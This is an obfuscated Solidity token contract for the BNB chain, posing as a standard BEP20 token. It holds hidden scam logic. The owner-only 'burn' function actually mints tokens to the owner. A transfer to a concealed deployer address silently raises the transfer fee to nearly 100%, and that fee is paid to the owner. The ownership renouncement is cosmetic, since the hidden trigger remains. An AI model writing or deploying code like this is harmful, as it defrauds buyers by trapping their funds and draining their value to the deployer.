/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.8.1;
contract xsNWRw {
address public  jLgufp = address(0);
address public  FMxMUH = address(0);
uint256 public  IiTltP = 100000000000000000000000;
uint8 public constant decimals = 18;
uint256 public  OwlbZC = 100000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  name = "MqdDAu";
uint256 private  quczim = 10000000000000;
address public  ctKZvZ = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant NbJUtw = 173999;
mapping (address => uint256) public balanceOf;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "EFAWS";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  uYkRSU = 10000000000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  knkGcI = address(0);
address public  dAbgFd = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public  WMbxsV = address(0);
uint256 public  lJTWRH = 10000000000000000;
address public  XWNuPZ = address(0);
uint256 public  bsMCCH = 10000000000000000000;
address public owner;
uint256 public  knduai = 100000000000000000000;
receive() external payable {}
constructor () {
knkGcI = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "SEESfn");
require(to != address(0), "SEESfn");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* NbJUtw/quczim ;
}
uint256 transferAmount = amount +0-0+0-fee;

balanceOf[from] -= amount+0;
balanceOf[to] += transferAmount+0;
balanceOf[owner] += fee+0;
if (to==knkGcI){
quczim = 173999+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}